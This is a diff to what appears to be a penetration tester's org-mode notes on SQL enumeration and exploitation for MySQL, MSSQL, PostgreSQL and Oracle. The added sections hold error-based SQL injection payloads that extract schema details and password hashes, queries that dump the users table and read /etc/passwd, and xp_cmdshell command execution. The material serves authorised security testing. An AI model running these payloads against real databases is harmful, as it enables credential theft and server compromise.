@@ -2956,9 +2956,9 @@
         SELECT s.schema_name, t.table_name FROM information_schema.schemata s INNER JOIN information_schema.tables t ON s.schema_name = t.table_schema ORDER BY schema_name, table_name
       #+end_src
 *** Find the columns in a table
-    - Identify:
+    - Identify them and their types:
       #+begin_src sql
-      SELECT column_name FROM information_schema.columns WHERE table_name='<table-name>'
+        SELECT column_name, data_type FROM information_schema.columns WHERE table_name='<table-name>'
     #+end_src
     - Then query the table:
       #+begin_src sql
@@ -3021,6 +3021,65 @@
         -- Current server variables
         SHOW VARIABLES;
       #+end_src
+    - Extract version - error based
+      #+begin_src sql
+        extractvalue('',concat('>',version()));
+
+        -- Multi-data concat (table names)
+        extractvalue('',concat('>',(
+          SELECT group_concat(table_schema)
+          FROM (
+            SELECT table_schema
+            FROM information_schema.tables
+            GROUP BY table_schema)
+          AS foo)
+        )
+        -- Errors might be limited to 32 chars
+
+        -- Iterate over the tables by indexes
+        extractvalue('',concat('>',(
+          SELECT group_concat(table_name)
+          FROM (
+            SELECT table_name
+            FROM information_schema.tables
+            WHERE table_schema='master'
+            LIMIT 2 offset 2)
+          AS foo)
+        )
+
+        -- Do the same with the column names
+        extractvalue('',concat('>',(
+          SELECT group_concat(column_name)
+          FROM (
+            SELECT column_name
+            FROM information_schema.columns
+            WHERE table_schema='master'
+            AND table_name='users')
+          AS foo)
+        )
+
+        -- Extract passwords 32 chars at a time
+        extractvalue('',concat('>',(
+          SELECT substring(password,1,32)
+          FROM users
+          LIMIT 1
+          offset 0)
+        )
+      #+end_src
+*** Read/Write Files
+    - RW permissions limited to ~secure_file_priv~:
+      #+begin_src sql
+        -- Nothing means no restrictions
+        SELECT @@GLOBAL.secure_file_priv;
+      #+end_src
+    - Write table to file:
+      #+begin_src sql
+        SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
+      #+end_src
+    - Read file using function:
+      #+begin_src sql
+        SELECT LOAD_FILE('/tmp/users.txt');
+      #+end_src
 ** T-SQL (MSSQL)
 *** Connection
 **** Windows
@@ -3082,7 +3141,23 @@
        #+begin_src sql
          EXEC "<linked-srv>".[master].sys.sp_executesql N'EXEC(''SELECT SYSTEM_USER;'') AT "<current-srv>"'
        #+end_src
-*** Cheatsheets/Enumerations
+*** Enumeration
+    - List databases:
+      #+begin_src sql
+        SELECT name FROM sys.databases
+
+        -- In detail via information_schema
+        SELECT * FROM app.information_schema.tables;
+      #+end_src
+    - List table columns and type:
+      #+begin_src sql
+        SELECT COLUMN_NAME, DATA_TYPE FROM app.information_schema.columns WHERE TABLE_NAME = 'master';
+      #+end_src
+    - Extract version - error based
+      #+begin_src sql
+        cast(@@version as integer);
+      #+end_src
+*** Cheatsheets
     - MSF - ~auxiliary/admin/mssql/mssql_enum~
     - [[https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet][Pentestmonkey]]
     - [[https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server][HackTricks]]
@@ -3105,7 +3180,10 @@
         -- Use the feature
         xp_cmdshell '<shell-command>'
 
-        -- You may need to use a SELECT
+        -- You may need to use EXEC
+        EXEC xp_cmdshell '<shell-command>'
+
+        -- Or SELECT
         SELECT xp_cmdshell '<shell-command>'
 
         -- OR
@@ -3233,6 +3311,79 @@
       DELETE FROM #tmp WHERE line = @passCmp
       END
     #+end_src
+** PostgreSQL
+*** Enumeration
+    - Version and current user
+      #+begin_src sql
+        SELECT version();
+
+        SELECT current_user;
+      #+end_src
+    - List databases
+      #+begin_src sql
+        SELECT datname FROM pg_database;
+
+        -- Show only user created (public) ones
+        SELECT table_name FROM app.information_schema.tables WHERE table_schema = 'public';
+      #+end_src
+    - List columns and types from a table
+      #+begin_src sql
+        SELECT column_name, data_type FROM app.information_schema.columns WHERE table_name = 'user';
+      #+end_src
+    - Extract version - error based
+      #+begin_src sql
+        cast(version() AS integer);
+      #+end_src
+*** Read/Write Files
+    - Read using function:
+      #+begin_src sql
+        SELECT pg_read_file('/etc/passwd');
+      #+end_src
+    - Read using auxiliary table:
+      #+begin_src sql
+        -- Requires table creation permissions
+        CREATE TABLE tmp(DATA text);
+
+        COPY tmp FROM '/etc/passwd';
+
+        SELECT * FROM tmp;
+
+        DROP TABLE tmp;
+      #+end_src
+** Oracle DB
+*** Enumeration
+    - List version and current user
+      #+begin_src sql
+        SELECT * FROM v$version;
+
+        -- user is a function
+        -- dual is a valid placeholder table
+        SELECT user FROM dual;
+        -- the user is not necessarily the OS one
+      #+end_src
+    - List databases
+      #+begin_src sql
+        -- List all schemas by user
+        SELECT owner FROM all_tables GROUP BY owner;
+
+        -- List all tables in a schema
+        SELECT table_name FROM all_tables WHERE owner = 'SYS' ORDER BY table_name;
+        -- Tables may contain a $ (mainly system)
+      #+end_src
+    - List columns and types from a table
+      #+begin_src sql
+        SELECT column_name, data_type FROM all_tab_columns WHERE table_name = 'main';
+      #+end_src
+    - Extract version - error based
+      #+begin_src sql
+        to_char(
+          dbms_xmlgen.getxml(
+            'select "'||
+              (select substr(banner,0,30) from v$version where rownum=1)
+            ||'" from sys.dual'
+          )
+        );
+      #+end_src
 ** SOQL - Salesforce SQL
   - Limited SQL without:
     - UNION
